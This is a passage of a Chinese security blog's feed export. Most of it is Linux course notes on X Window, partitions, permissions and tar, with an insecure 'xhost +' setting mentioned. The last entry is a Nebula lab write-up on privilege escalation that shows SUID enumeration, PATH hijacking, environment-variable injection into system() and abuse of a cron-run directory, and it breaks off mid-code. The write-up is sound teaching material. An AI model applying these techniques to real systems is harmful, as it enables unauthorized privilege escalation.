    <content type="html"><![CDATA[<h4 id="1-远程X的设置"><a href="#1-远程X的设置" class="headerlink" title="1. 远程X的设置"></a>1. 远程X的设置</h4><p>X Window系统是一个网络化的视窗系统，它能 够在位映象的屏幕上显示窗口式的文本和图形。<br>X Window系统还可以叫做X11或者X<br>使用X 的两种启动方式：<br>1 先进入命令行界面，然后运行：startx<br>2 开机自动进入图形界面：在/etc/inittab中配置运行 级别为5 </p><p>在X应用程序后面加上-display和显示的名字<br>如：xeyes -display  192.168.0.3:0<br>表示xeyes在192.168.0.3的显示0上显示</p><p>远程的X安全性<br> 基于主机的访问控制</p><ul><li>xhost  +  允许任何人访问</li><li>xhost  -   限制访问 <ul><li>在限制访问下为某个主机打开访问控制，使用 xhost +主机名（或IP）</li><li>去除某个主机的连接，使用 xhost  -主机名（或IP）s</li></ul></li></ul><h4 id="2-vi（教案第3章P21中红色标注的命令）"><a href="#2-vi（教案第3章P21中红色标注的命令）" class="headerlink" title="2.vi（教案第3章P21中红色标注的命令）"></a>2.vi（教案第3章P21中红色标注的命令）</h4><p><img src="https://upload-images.jianshu.io/upload_images/5443560-ad625889a788ed49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-远程X的设置&quot;&gt;&lt;a href=&quot;#1-远程X的设置&quot; class=&quot;headerlink&quot; title=&quot;1. 远程X的设置&quot;&gt;&lt;/a&gt;1. 远程X的设置&lt;/h4&gt;&lt;p&gt;X Window系统是一个网络化的视窗系统，它能 够在位映象的屏幕上显示窗口式的文本和图
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>安装和启动</title>
    <link href="http://www.daikersec.com/wiki/ac994e7.html"/>
    <id>http://www.daikersec.com/wiki/ac994e7.html</id>
    <published>2018-06-24T14:10:21.000Z</published>
    <updated>2018-06-24T14:53:42.799Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-文本安装模式进入到shell的方式"><a href="#1-文本安装模式进入到shell的方式" class="headerlink" title="1. 文本安装模式进入到shell的方式"></a>1. 文本安装模式进入到shell的方式</h4><p>alt+F2</p><h4 id="2-硬盘及分区代号"><a href="#2-硬盘及分区代号" class="headerlink" title="2. 硬盘及分区代号"></a>2. 硬盘及分区代号</h4><p><img src="https://upload-images.jianshu.io/upload_images/5443560-231b6f9b65c351b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>Master就是主盘的意思，Slave就是从盘的意思<br>除了这个还有promary分区(主分区)和Logical 分区(逻辑分区)<br><img src="https://upload-images.jianshu.io/upload_images/5443560-2a4ae344befa614a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>一个硬盘最多有4个主分区。那以第一个从 扩展分区分出来的逻辑分区为/dev/hda5<br>看下面这个例题<br><img src="https://upload-images.jianshu.io/upload_images/5443560-20122906cbfdd018.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="3-分区划分原则"><a href="#3-分区划分原则" class="headerlink" title="3. 分区划分原则"></a>3. 分区划分原则</h4><p><img src="https://upload-images.jianshu.io/upload_images/5443560-b8c9ade017b74758.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="4-inittab文件的作用（关键字不用记）"><a href="#4-inittab文件的作用（关键字不用记）" class="headerlink" title="4. inittab文件的作用（关键字不用记）"></a>4. inittab文件的作用（关键字不用记）</h4><p><img src="https://upload-images.jianshu.io/upload_images/5443560-c4b34f17976fe486.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>level<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a611d4621f470456.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-04a1f5add6270c9a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="5-系统初始化流程"><a href="#5-系统初始化流程" class="headerlink" title="5. 系统初始化流程"></a>5. 系统初始化流程</h4><p><img src="https://upload-images.jianshu.io/upload_images/5443560-ec05480240cb20c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-54c1ac24d02c6a91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-55fb05ce7b710d43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-666111e29b8c5fae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-7003dea72c436114.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-c4d60b125bce40ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-文本安装模式进入到shell的方式&quot;&gt;&lt;a href=&quot;#1-文本安装模式进入到shell的方式&quot; class=&quot;headerlink&quot; title=&quot;1. 文本安装模式进入到shell的方式&quot;&gt;&lt;/a&gt;1. 文本安装模式进入到shell的方式&lt;/h4&gt;&lt;p&gt;
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>基础</title>
    <link href="http://www.daikersec.com/wiki/20dbfd00.html"/>
    <id>http://www.daikersec.com/wiki/20dbfd00.html</id>
    <published>2018-06-24T14:09:50.000Z</published>
    <updated>2018-06-24T14:30:19.942Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-shell的版本"><a href="#1-shell的版本" class="headerlink" title="1. shell的版本"></a>1. shell的版本</h4><p>Linux 结构<br><img src="https://upload-images.jianshu.io/upload_images/5443560-d876d23ed5670729.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>内核:运行程序和 管理像磁盘和打印机等硬件设备的核心程序,要设计得尽可能的 小。<br>Shell:Shell是系统的用户界面，提供了用户与内核进 行交互操作的一种接口。它接收用户输入的命 令并把它送入内核去执行。<br>版本：<br>Bourne Shell：是贝尔实验室开发的。 (sh)<br>oBASH：是GNU的Bourne Again Shell，是GNU 操作系统上默认的shell。<br>oKorn Shell：是对Bourne Shell的发展，在大部分 内容上与Bourne Shell兼容。<br>oC Shell：是SUN公司Shell的BSD版本</p><h4 id="2-虚拟控制台的切换"><a href="#2-虚拟控制台的切换" class="headerlink" title="2.虚拟控制台的切换"></a>2.虚拟控制台的切换</h4><p>（alt＋F1～F6可切换） </p><h4 id="3-文件命名规则-跟变量名挺像的"><a href="#3-文件命名规则-跟变量名挺像的" class="headerlink" title="3. 文件命名规则(跟变量名挺像的)"></a>3. 文件命名规则(跟变量名挺像的)</h4><p>1 字母数字下划线<br>3 不规定扩展名<br>4 习惯上用类似扩展名的方式来表示文件系统，如prog.c为C源程序<br>5  以<code>.</code>开头的文件名为隐藏文件</p><p>比如<code>1.txt</code>,<code>abc.txt</code>,<code>1_1.txt</code>,</p><h4 id="4-绝对路径和相对路径"><a href="#4-绝对路径和相对路径" class="headerlink" title="4. 绝对路径和相对路径"></a>4. 绝对路径和相对路径</h4><p>绝对路径:从根开始的路径，比如<code>/home</code><br>相对路径:从当前目录开始的路径,比如<code>dir/</code></p><h4 id="5-硬连接和软连接（符号连接）"><a href="#5-硬连接和软连接（符号连接）" class="headerlink" title="5. 硬连接和软连接（符号连接）"></a>5. 硬连接和软连接（符号连接）</h4><p> 硬连接：<code>ln file targetfile o</code></p><ul><li>不用任何参数；</li><li>源文件与目标文件须在同一文件系统</li><li>只能用于文件连接</li><li><p>源文件和目标文件都引用同一个inode（索引节 点）和盘上相同的数据（文件内容）。</p><p>符号连接：<code>ln –s  file target</code></p></li><li>目标文件指向源文件的路径和名字而不是它的数据。 </li><li>符号连接对所有命令是透明的（除ls和rm） </li><li>目标文件指向一个新的inode，不同于源文件的 inode<br>####6.UID和GID<br>每个用户都有一个UID（User ID）和GID（Group ID），可通过/etc/passwd修改UID和GID<br>用id命令查看当前的用户和组的值<br>文件权限的确认是通过识别当前用户的UID或GID进行 的。而和用户的名字或组的名字无关<br>####7. 文件属性、修改文件权限<br><img src="https://upload-images.jianshu.io/upload_images/5443560-bb5b75f110d0d09b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>第一位属性： </li><li>为 d 表示是目录； </li><li>为 - 表示是文件； </li><li>为 l  表示是连接文件； </li><li>为 b 表示是可供存储的设备； <ul><li>为 c  表示是其他外围设备，如键盘、鼠标等。 </li></ul></li></ul><p>其他9位属性称为保护标志（权限字），每3位为一组，即 对三类用户（用户、组和其他）提供保护<br>要存取一个文件或目录，对于每一个用户，都必须提供相 应的权限<br><img src="https://upload-images.jianshu.io/upload_images/5443560-7e5f38d852ef7e45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-c3ddfdd31f0010ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="8-备份和压缩工具"><a href="#8-备份和压缩工具" class="headerlink" title="8. 备份和压缩工具"></a>8. 备份和压缩工具</h4><p>tar 命令</p><ul><li>-c：创建一个档案 n<ul><li>-x：从档案中解开文件 </li><li>-v：详细显示过程（verbose） </li><li>-f：指定操作的tar文件名 </li><li>-t：浏览档案的内容</li><li>-z：用gzip进行压缩 </li><li>-Z：用compress进行压缩 </li><li>-j：用bzip2进行压缩 </li><li>-N/–newer  ‘date’：备份指定日期以后变化 的文件</li></ul></li></ul><p>常用压缩命令<br><code>tar zcvf haha.gz haha</code><br>要解压就吧c变成x<br><code>tar zxvf haha.gz</code></p><p>如果是bzip2的格式，，就把z变成j<br><code>tar jcvf haha.bz2 haha</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-shell的版本&quot;&gt;&lt;a href=&quot;#1-shell的版本&quot; class=&quot;headerlink&quot; title=&quot;1. shell的版本&quot;&gt;&lt;/a&gt;1. shell的版本&lt;/h4&gt;&lt;p&gt;Linux 结构&lt;br&gt;&lt;img src=&quot;https://upload
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>简介</title>
    <link href="http://www.daikersec.com/wiki/4b7d48f2.html"/>
    <id>http://www.daikersec.com/wiki/4b7d48f2.html</id>
    <published>2018-06-24T14:09:17.000Z</published>
    <updated>2018-06-24T14:54:10.658Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-一个Linux操作系统包含了Linux内核、标准-GNU（由自由软件基金会组织的）实用工具和-开放源代码应用程序"><a href="#1-一个Linux操作系统包含了Linux内核、标准-GNU（由自由软件基金会组织的）实用工具和-开放源代码应用程序" class="headerlink" title="1. 一个Linux操作系统包含了Linux内核、标准 GNU（由自由软件基金会组织的）实用工具和 开放源代码应用程序"></a>1. 一个Linux操作系统包含了Linux内核、标准 GNU（由自由软件基金会组织的）实用工具和 开放源代码应用程序</h4><h4 id="2-自由软件"><a href="#2-自由软件" class="headerlink" title="2. 自由软件"></a>2. 自由软件</h4><p>自由软件不等于开源软件<br>如果一个软件是自由软件，那么它必须为用户提供以下四项基本自由：</p><ul><li>自由度0：无论用户出于何种目的，必须可以按照用户意愿，自由地运行该软件。</li><li>自由度1：用户可以自由地学习并修改该软件，以此来帮助用户完成用户自己的计算。作为前提，用户必须可以访问到该软件的源代码。</li><li>自由度2：用户可以自由地分发该软件的拷贝，这样就可以助人。</li><li>自由度3：用户可以自由地分发该软件修改后的拷贝。借此，用户可以把改进后的软件分享给整个社区令他人也从中受益。作为前提，用户必须可以访问到该软件的源代码。<br>####3. GPL规则<br>如果你使用并且修改了我的GPL软件，那么你的软件也必须要开源，否则就不能使用我的软件，你是否把你的软件商用和我没关系。<br>出售自由软件的组织一定要遵循一定的GPL规则：<br>1）不能限制购买软件的用户自由权；<br>2）必须告诉 用户软件属于GPL范畴；<br>3）必须提供软件完整的 源代码。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-一个Linux操作系统包含了Linux内核、标准-GNU（由自由软件基金会组织的）实用工具和-开放源代码应用程序&quot;&gt;&lt;a href=&quot;#1-一个Linux操作系统包含了Linux内核、标准-GNU（由自由软件基金会组织的）实用工具和-开放源代码应用程序&quot; cl
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux简易入门绪</title>
    <link href="http://www.daikersec.com/wiki/fb27c52e.html"/>
    <id>http://www.daikersec.com/wiki/fb27c52e.html</id>
    <published>2018-06-24T14:09:05.000Z</published>
    <updated>2018-06-24T14:29:18.823Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-说明"><a href="#0x00-说明" class="headerlink" title="0x00 说明"></a>0x00 说明</h2><h2 id="0x01-内容要点"><a href="#0x01-内容要点" class="headerlink" title="0x01 内容要点"></a>0x01 内容要点</h2><p>1、自由软件、GPL规则<br>2、shell的版本、虚拟控制台的切换、文件命名规则、绝对路径和相对路径<br>3、硬连接和软连接（符号连接）、UID和GID、文件属性、修改文件权限、备份和压缩工具<br>4、vi（教案第3章P21中红色标注的命令）<br>5、文本安装模式进入到shell的方式、硬盘及分区代号、分区划分原则<br>6、inittab文件的作用（关键字不用记）、系统初始化流程、启动脚本程序的设置<br>7、远程X的设置<br>8、shell变量赋值、变量引用、系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）、shell通配符、引号、正则表达式、输入输出命令、管道、shell脚本<br>9、RPM的安装、卸载、升级、查询、验证<br>10、用户管理<br>11、PID、PPID、EUID、EGID，监视进程、管理进程、信号发送的命令kill<br>12、文件和目录的访问控制、粘滞位<br>13、crontab的配置 </p><h2 id="0x02-目录"><a href="#0x02-目录" class="headerlink" title="0x02 目录"></a>0x02 目录</h2><ul><li><a href="https://www.jianshu.com/p/ffe81766c479" target="_blank" rel="noopener">0 Linux 简介</a></li><li><a href="https://www.jianshu.com/p/c7f74a0947a3" target="_blank" rel="noopener">1 Linux 基础</a></li><li><a href="https://www.jianshu.com/p/05c2095031ac" target="_blank" rel="noopener">2 Linux 安装和启动</a></li><li><a href="https://www.jianshu.com/p/74bc62c9957b" target="_blank" rel="noopener">3 Linux GUI和文本编辑</a></li><li><a href="https://www.jianshu.com/p/815fae7a9708" target="_blank" rel="noopener">4 Linux 软件管理</a></li><li><a href="https://www.jianshu.com/p/369ee974efc8" target="_blank" rel="noopener">5 Linux shell和shell编程</a></li><li><a href="https://www.jianshu.com/p/fd15facc74b5" target="_blank" rel="noopener">6 Linux 用户管理</a></li><li><a href="https://www.jianshu.com/p/19a2531ec53d" target="_blank" rel="noopener">7 Linux 进程管理</a></li><li><a href="https://www.jianshu.com/p/4bdae02d4278" target="_blank" rel="noopener">8 Linux 权限管理</a></li><li><a href="https://www.jianshu.com/p/0218cea0a72e" target="_blank" rel="noopener">9 Linux 调度任务</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-说明&quot;&gt;&lt;a href=&quot;#0x00-说明&quot; class=&quot;headerlink&quot; title=&quot;0x00 说明&quot;&gt;&lt;/a&gt;0x00 说明&lt;/h2&gt;&lt;h2 id=&quot;0x01-内容要点&quot;&gt;&lt;a href=&quot;#0x01-内容要点&quot; class=&quot;header
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>利用Nebula学习Linux提权</title>
    <link href="http://www.daikersec.com/wiki/5c949747.html"/>
    <id>http://www.daikersec.com/wiki/5c949747.html</id>
    <published>2018-06-04T09:00:24.000Z</published>
    <updated>2018-06-20T06:18:46.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Nebula介绍和玩法"><a href="#0x00-Nebula介绍和玩法" class="headerlink" title="0x00 Nebula介绍和玩法"></a>0x00 Nebula介绍和玩法</h2><p>Nebula 是# <a href="https://exploit-exercises.com/" target="_blank" rel="noopener">Exploit Exercises </a>上的基础关<br>他涉及了基本的<code>源码级漏洞分析</code>、<code>提权</code>。可以通过官网下载镜像进行安装。<br>每一关都对应系统中以level开头的账号，密码与账号名相同（比如<code>Level01</code>,对应的系统帐号是<code>level0</code>1），每玩一关，都需要用对应的账号登录系统，然后进入到<code>/home/flag×</code>目录中，与该level相关的代码、数据等都放在于此。之后通过运行getflag 来验证是否提权成功</p><h2 id="0x01-level00"><a href="#0x01-level00" class="headerlink" title="0x01 level00"></a>0x01 level00</h2><blockquote><p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p></blockquote><p>查找suid的程序，直接通过find查找<br><a id="more"></a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>看到比较奇怪的一个文件<code>/bin/.../flag00</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-968153e5e4a3fb30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>提权成功<br><img src="https://upload-images.jianshu.io/upload_images/5443560-38e7dea4087e2f0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>是flag00不是level00了。<br>这里利用的是suid 提权。研究下原理<br>先看flag00的权限<br><img src="https://upload-images.jianshu.io/upload_images/5443560-ddf0bd66d9fab286.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>有setUid<br>setUid的功能是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、SUID权限仅对二进制程序有效。</span><br><span class="line">2、执行者对于该程序需要具有x的可执行权限。</span><br><span class="line">3、本权限仅在执行该程序的过程中有效。</span><br><span class="line">4、执行者将具有该程序拥有者的权限。</span><br></pre></td></tr></table></figure></p><p>再用IDA查看下flag00<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__gid_t</span> v3; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">__uid_t</span> v4; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v3 = getegid();</span><br><span class="line">  v4 = geteuid();</span><br><span class="line">  setresgid(v3, v3, v3);</span><br><span class="line">  setresuid(v4, v4, v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Congrats, now run getflag to get your flag!"</span>);</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">"/bin/sh"</span>, (<span class="keyword">char</span> *<span class="keyword">const</span> *)argv, (<span class="keyword">char</span> *<span class="keyword">const</span> *)envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以大体的原理就是<code>flag00</code>属于<code>flag00</code>这个用户,在<code>level00</code>这个组。<br>在<code>level00</code>这个用户也在<code>level00</code>这个组里面，这里拥有执行权限,而程序又有<code>suid</code>，因此<code>level00</code>在运行这个程序的时候暂时性拥有这个<code>flag00</code>的权限，接下来执行一个<code>shell</code>，并且这个<code>shell</code>传进的环境继承刚刚的环境,因此<code>shell</code>运行的时候的权限还是属于<code>flag00</code>的</p><h2 id="0x02-level01"><a href="#0x02-level01" class="headerlink" title="0x02 level01"></a>0x02 level01</h2><blockquote><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?<br>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">gid_t</span> gid;</span><br><span class="line">  <span class="keyword">uid_t</span> uid;</span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">"/usr/bin/env echo and now what?"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个文件也有suid,关键在最后一句，我们能不能让最后一句执行shell。<br>这里面<code>/usr/bin/env</code>后面跟着的是环境变量中的可执行程序，正常这一句，应该要在环境变量中寻找echo 这个可执行程序<br><img src="https://upload-images.jianshu.io/upload_images/5443560-51d87655eb032c8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-bb403037400503a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这个时候就会执行正常的echo。那我们的思路是</p><blockquote><p>在/usr/bin这个环境变量之前添加个环境变量<code>/home/level01</code>，在’level01’里面有个我们自定义的echo.</p></blockquote><p>这样不就执行我们自己的程序了<br><img src="https://upload-images.jianshu.io/upload_images/5443560-75e27c0b066bfa50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="0x03-level02"><a href="#0x03-level02" class="headerlink" title="0x03 level02"></a>0x03 level02</h2><blockquote><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?<br>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *buffer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">gid_t</span> gid;</span><br><span class="line">  <span class="keyword">uid_t</span> uid;</span><br><span class="line"></span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  buffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  asprintf(&amp;buffer, <span class="string">"/bin/echo %s is cool"</span>, getenv(<span class="string">"USER"</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"about to call system(\"%s\")\n"</span>, buffer);</span><br><span class="line">  </span><br><span class="line">  system(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟上面类似，就要构造USER的值来填补，就可以进一步调用<code>/bin/sh</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-8ce2a50e7a50a783.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="0x04-level03"><a href="#0x04-level03" class="headerlink" title="0x04 level03"></a>0x04 level03</h2><blockquote><p>Check the home directory of flag03 and take note of the files there.<br>There is a crontab that is called every couple of minutes.<br>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p></blockquote><p>在<code>/home/flag03</code>里面发现有一个文件<code>writable.sh</code>和<code>writable.d</code><br>查看<code>writeable.sh</code>的内容<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a88076a133a16e24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>大意就是循环执行一遍writable.d文件夹底下的文件。然后删除。这个时候看题目，<code>There is a crontab that is called every couple of minutes.</code>几分钟会被调用一次。我们猜测可能是执行<code>writable.sh</code><br>把我们要执行的东西写到 <code>writable.d</code>里面去<br><img src="https://upload-images.jianshu.io/upload_images/5443560-09048910817293bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>然后等个几分钟<br><img src="https://upload-images.jianshu.io/upload_images/5443560-326b1e34111dcb4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>接下来我们用root身份来看下corntab.<br><img src="https://upload-images.jianshu.io/upload_images/5443560-74c7cc753e68f46b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-382ad96faf251a97.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>每三分钟执行一次<code>writable.sh</code></p><h2 id="0x05-level04"><a href="#0x05-level04" class="headerlink" title="0x05 level04"></a>0x05 level04</h2><blockquote><p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)<br>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 